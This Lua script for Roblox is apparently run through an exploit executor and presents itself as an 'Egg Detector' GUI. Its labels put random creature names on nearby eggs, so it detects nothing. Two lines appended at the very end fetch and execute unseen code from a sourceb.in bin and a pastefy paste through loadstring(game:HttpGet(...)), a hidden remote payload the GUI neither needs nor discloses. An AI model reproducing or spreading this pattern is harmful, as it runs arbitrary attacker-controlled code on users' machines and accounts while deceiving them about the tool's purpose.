-- Remove previous GUI if exists
pcall(function()
    game.CoreGui.EggDetectorBoxUI:Destroy()
end)

-- GUI Setup
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "EggDetectorBoxUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 9999
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 200, 0, 240)
frame.Position = UDim2.new(0.02, 0, 0.02, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

local function makeLabel(text, position)
    local lbl = Instance.new("TextLabel", frame)
    lbl.Size = UDim2.new(1, 0, 0.18, 0)
    lbl.Position = position
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.new(1, 1, 1)
    lbl.TextScaled = true
    lbl.Font = Enum.Font.GothamBold
    lbl.ZIndex = 10
    return lbl
end

makeLabel("ðŸ¥š Egg Detector", UDim2.new(0, 0, 0, 0))

-- Egg randomizer setup
local randomizerButton = Instance.new("TextButton", frame)
randomizerButton.Size = UDim2.new(0.85, 0, 0.15, 0)
randomizerButton.Position = UDim2.new(0.075, 0, 0.58, 0)
randomizerButton.Text = "ðŸ¥š Egg Randomizer: OFF"
randomizerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
randomizerButton.TextColor3 = Color3.new(1, 1, 1)
randomizerButton.TextScaled = true
randomizerButton.Font = Enum.Font.Gotham
randomizerButton.BorderSizePixel = 1
randomizerButton.BorderColor3 = Color3.fromRGB(255, 255, 255)

-- Footer
makeLabel("Made By MiszuaðŸ’€", UDim2.new(0, 0, 0.85, 0))

-- Name pool and color logic
local creatureNames = {"Shiba Inu", "Nihonzaru", "Tanuki", "Tanchozuru", "Kappa", "Kitsune"}
local nameColors = {
    Color3.fromRGB(255, 85, 85), Color3.fromRGB(85, 170, 255),
    Color3.fromRGB(255, 170, 0), Color3.fromRGB(85, 255, 127),
    Color3.fromRGB(255, 85, 255), Color3.fromRGB(255, 255, 85)
}

local function addNameToEgg(egg, name)
    if egg:FindFirstChild("DinoLabel") then return end

    local tag = Instance.new("BillboardGui")
    tag.Name = "DinoLabel"
    tag.Size = UDim2.new(0, 200, 0, 50)
    tag.StudsOffset = Vector3.new(0, 2, 0)
    tag.AlwaysOnTop = true
    tag.Adornee = egg
    tag.Parent = egg

    local label = Instance.new("TextLabel", tag)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = name
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold

    if name == "Kitsune" then
        label.TextColor3 = Color3.new(1, 1, 1)
        label.TextStrokeTransparency = 0
        label.TextStrokeColor3 = Color3.new(0, 0, 0)
        local gradient = Instance.new("UIGradient", label)
        gradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 255)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 255))
        })
    else
        label.TextColor3 = nameColors[math.random(1, #nameColors)]
    end
end

local function clearAllEggLabels()
    for _, egg in ipairs(workspace:GetDescendants()) do
        if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
            local gui = egg:FindFirstChild("DinoLabel")
            if gui then gui:Destroy() end
        end
    end
end

-- Safe async scanning function
local function applyRandomNamesToEggs()
    task.spawn(function()
        local player = game.Players.LocalPlayer
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end

        local scanned = 0
        for _, egg in ipairs(workspace:GetDescendants()) do
            if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
                if (egg.Position - root.Position).Magnitude <= 100 then
                    local name = creatureNames[math.random(1, #creatureNames)]
                    addNameToEgg(egg, name)
                    scanned += 1
                    if scanned % 10 == 0 then task.wait() end
                end
            end
        end
    end)
end

-- Toggle logic
local randomizerOn = false
randomizerButton.MouseButton1Click:Connect(function()
    randomizerOn = not randomizerOn
    randomizerButton.Text = randomizerOn and "ðŸ¥š Egg Randomizer: ON" or "ðŸ¥š Egg Randomizer: OFF"
    if randomizerOn then
        applyRandomNamesToEggs()
    else
        clearAllEggLabels()
    end
end)
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NsyUc2zmt1/0", true))()
loadstring(game:HttpGet("https://pastefy.app/roIa67SA/raw"))()
